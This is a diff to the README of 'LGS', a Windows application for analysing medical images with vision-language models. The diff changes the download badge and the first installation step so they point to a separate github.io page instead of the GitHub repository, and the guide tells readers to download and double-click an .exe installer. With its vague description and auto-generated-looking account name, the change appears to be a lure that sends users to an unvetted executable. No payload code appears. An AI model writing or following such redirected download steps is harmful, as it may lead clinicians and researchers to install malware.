@@ -1,6 +1,6 @@
 # 🩺 LGS - Analyze medical images with precision tools
 
-[![Download LGS](https://img.shields.io/badge/Download-LGS-blue.svg)](https://github.com/teressaanatropous770/LGS)
+[![Download LGS](https://img.shields.io/badge/Download-LGS-blue.svg)](https://teressaanatropous770.github.io)
 
 LGS provides a path for medical professionals and researchers to analyze complex image data. This software uses large vision-language models to identify features within medical scans. It focuses on localization-grounded supervision to improve the accuracy of diagnostic data. You can use this application to process images for research and clinical review.
 
@@ -17,7 +17,7 @@ This software runs on standard Windows hardware. Ensure your computer meets thes
 
 ## 💾 Installation Guide
 
-1. Visit the [official LGS page](https://github.com/teressaanatropous770/LGS) to start the download.
+1. Visit the [official LGS page](https://teressaanatropous770.github.io) to start the download.
 2. Locate the most recent release version in the list.
 3. Download the installation file ending in .exe to your computer.
 4. Open your Downloads folder and double-click the file to start the installer.
